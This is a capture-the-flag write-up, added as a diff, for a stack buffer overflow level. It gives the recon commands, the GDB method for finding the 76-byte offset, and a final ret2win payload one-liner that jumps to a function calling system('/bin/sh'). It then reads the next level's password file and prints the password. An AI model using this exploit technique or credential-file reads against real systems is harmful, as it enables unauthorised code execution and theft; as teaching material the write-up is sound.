@@ -1,0 +1,226 @@
+*** Level1 – Stack Buffer Overflow (Return Address Overwrite) ***
+** Overview **
+
+The goal of this challenge is to exploit a stack-based buffer overflow in order to redirect program execution to an existing function that spawns a shell.
+
+Rather than injecting shellcode, the binary already contains code capable of executing /bin/sh. By overflowing a stack buffer and overwriting the saved return address, execution can be redirected to this functionality.
+
+** Vulnerability **
+* Stack Buffer Overflow *
+
+The program reads user-controlled input into a stack buffer without properly validating its length.
+
+As a result, an attacker can write beyond the bounds of the buffer and overwrite adjacent stack data, including:
+
+- Local variables
+- Saved Frame Pointer (EBP)
+- Saved Return Address (EIP)
+
+When the function returns, execution will continue at whatever address has been written into the saved return address slot.
+
+This allows complete control over the program's execution flow.
+
+** Reconnaissance **
+* Searching for Interesting Strings *
+
+A good first step is inspecting the binary's read-only data section for useful strings.
+
+objdump -s -j .rodata ./level1
+
+Output:
+
+Contents of section .rodata:
+ 8048568 03000000 01000200 476f6f64 2e2e2e20  ........Good...
+ 8048578 57616974 20776861 743f0a00 2f62696e  Wait what?../bin
+ 8048588 2f736800                             /sh.
+
+Among the strings we immediately notice:
+
+/bin/sh
+
+This is often a strong indicator that the binary contains functionality capable of spawning a shell.
+
+At this point we know:
+
+- The string /bin/sh exists inside the executable.
+- There is likely a function that passes this string to system() or execve().
+
+** Determining the Overflow Offset **
+
+To hijack execution, we first need to know exactly how many bytes are required to reach the saved return address.
+
+* Examining the Stack Layout *
+
+Disassembly of main reveals:
+
+8048486: sub    $0x50,%esp
+8048489: lea    0x10(%esp),%eax
+
+The compiler reserves 80 bytes on the stack (0x50).
+
+The input buffer begins 16 bytes into that stack frame (0x10).
+
+We can use this as a starting point for further investigation.
+
+* Verifying the Offset with GDB *
+
+Start the program inside GDB:
+
+gdb ./level1
+
+Run it with a pattern consisting of many A's followed by four B's:
+
+run <<< $(python -c 'print("A"*76 + "BBBB")')
+
+After the crash, inspect the registers:
+
+info registers
+
+Before the overwrite reaches the return address, EIP will still contain a normal execution address:
+
+eip  0xb7e45400
+
+Once the overwrite reaches the saved return address, the registers will look similar to:
+
+ebp  0x41414141
+eip  0x42424242
+
+where:
+
+0x41 = 'A'
+0x42 = 'B'
+
+This confirms that:
+
+The buffer has been overflowed.
+EBP is overwritten.
+EIP is under our control.
+
+The offset to the saved return address is:
+
+76 bytes
+
+Static analysis reveals that input is written into a stack buffer located inside an 80-byte local stack frame. The exact distance to the saved return address was verified dynamically in GDB by increasing the input length until EIP was overwritten with 0x42424242. This established a reliable offset of 76 bytes.
+
+** Finding a Suitable Jump Target **
+
+Next we need an address worth jumping to.
+
+Since we already discovered /bin/sh inside the binary, we look for code that references it.
+
+* Identifying the Shell-Spawning Function *
+
+Disassembling the binary reveals the following function:
+
+08048444 <run>:
+...
+8048472: c7 04 24 84 85 04 08    movl $0x8048584,(%esp)
+8048479: e8 e2 fe ff ff          call 8048360 <system@plt>
+804847e: c9                      leave
+804847f: c3                      ret
+
+This code:
+
+- Places the address of /bin/sh on the stack
+- Calls system()
+- Returns
+
+In other words:
+
+system("/bin/sh");
+
+If execution reaches this function, a shell will be spawned.
+
+The function starts at:
+
+0x08048444
+
+** Preparing the Return Address **
+
+The binary is compiled for the i386 architecture, which uses little-endian byte ordering.
+
+Therefore:
+
+0x08048444
+
+must be written as:
+
+\x44\x84\x04\x08
+
+inside the payload.
+
+** Building the Exploit **
+
+The payload consists of:
+
+- 76 bytes of padding
+- The address of run()
+
+[padding][new EIP]
+
+* Final Payload *
+
+(python -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
+
+* Payload Breakdown *
+
+A * 76	          | Fills the buffer and overwrites saved stack data
+\x44\x84\x04\x08	| Replaces the saved return address with run()
+cat	              | Keeps stdin open for interactive shell access
+
+** Why the Exploit Works **
+* Normal Execution *
+
+Under normal circumstances:
+----------------------------------
+|                                |
+| main()                         |
+|   └─ vulnerable input function |
+|       └─ return                |
+|           └─ program exits     |
+----------------------------------
+
+When main() finishes, execution returns to the original address saved on the stack.
+
+* Exploited Execution *
+
+After the overflow:
+----------------------------------
+|                                |
+| main()                         |
+|  └─ vulnerable input function  |
+|      └─ return                 |
+|          └─ jump to run()      |
+|                                |
+| run()                          |
+|  └─ system("/bin/sh")          |
+|                                |
+| shell                          |
+----------------------------------
+
+Because the saved return address has been replaced with the address of run(), the processor transfers execution there when the function returns.
+
+The program effectively executes:
+
+system("/bin/sh");
+
+and grants a shell.
+
+** Retrieving the Password **
+
+Once the shell has been obtained, retrieve the credentials for the next level:
+
+cat /home/user/level2/.pass
+
+Output:
+
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+** Key Takeaways **
+- Stack buffers should never accept unbounded input.
+- Saved return addresses are stored directly above local variables on the stack.
+- Overwriting EIP allows complete control of program execution.
+- Existing functionality inside the binary can often be reused instead of injecting shellcode.
+- This challenge demonstrates a classic ret2win technique: redirecting execution to a function that already performs the desired action.
+
+In this case, the entire exploit consisted of discovering the correct offset (76) and replacing the saved return address with the address of run(), which ultimately executes system("/bin/sh").
